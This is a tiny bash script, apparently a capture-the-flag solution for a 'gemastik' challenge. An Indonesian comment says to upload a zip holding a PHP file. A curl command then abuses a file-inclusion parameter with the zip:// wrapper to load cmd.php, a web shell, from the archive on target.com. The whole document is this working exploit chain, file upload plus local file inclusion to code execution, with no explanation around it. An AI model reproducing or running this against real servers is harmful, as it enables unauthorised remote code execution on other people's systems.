#!/usr/bin/env bash

#upload file .zip didalamnya file php

curl target.com/index.php?section=zip://gemastik-upload/md5code.file#cmd.php
